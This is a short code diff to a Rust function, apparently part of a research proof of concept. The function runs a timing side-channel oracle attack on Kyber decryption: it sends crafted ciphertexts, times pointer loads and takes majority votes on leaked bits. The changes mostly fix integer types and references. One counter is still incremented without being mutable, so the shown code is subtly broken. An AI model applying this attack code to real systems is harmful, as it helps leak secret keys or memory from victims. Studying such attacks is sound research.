@@ -467,7 +467,7 @@ fn kyber_hacker(
 
     // instead of creating a ciphertext here, we rely on a smart process that will submit us
     // with them, we just need to measure the timing, i.e. we are implementing an oracle here
-    let oracle_repetitions = 3;
+    let oracle_repetitions: u16 = 3;
 
     // Send random mask and masked pointer so that constructed ciphertext is decrypted into
     // message containing victim pointer
@@ -485,7 +485,7 @@ fn kyber_hacker(
 
     loop {
         oracle_stream.read_exact(&mut msg_data).unwrap();
-        if msg_data[0] {
+        if msg_data[0] != 0 {
             break;
         }
         oracle_stream.read_exact(&mut ct).unwrap();
@@ -512,7 +512,7 @@ fn kyber_hacker(
             ct[0] = ct[0] | (__trash & MSB_MASK) as u8;
 
             // send cipher text
-            stream.write_all(ct).unwrap();
+            stream.write_all(&ct).unwrap();
 
             // receive finish signal
             stream.read_exact(&mut msg_data).unwrap();
@@ -539,14 +539,14 @@ fn kyber_hacker(
             stream.write_all(&ct_rand).unwrap();
             stream.read_exact(&mut msg_data).unwrap();
         }
-        let successes: u8 = 0;
+        let successes: u16 = 0;
         for test_time in times_to_load_test_ptr_atk {
             // If time is low, we got target_ptr, i.e. inequality is satisfied
             if test_time < threshold_leak {
                 successes += 1;
             }
         }
-        let majority_vote: u8 = (successes * 2 > oracle_repetitions as u32) as u8;
+        let majority_vote: u8 = (successes * 2 > oracle_repetitions) as u8;
         msg_data[0] = majority_vote;
         oracle_stream.write_all(&msg_data);
     }
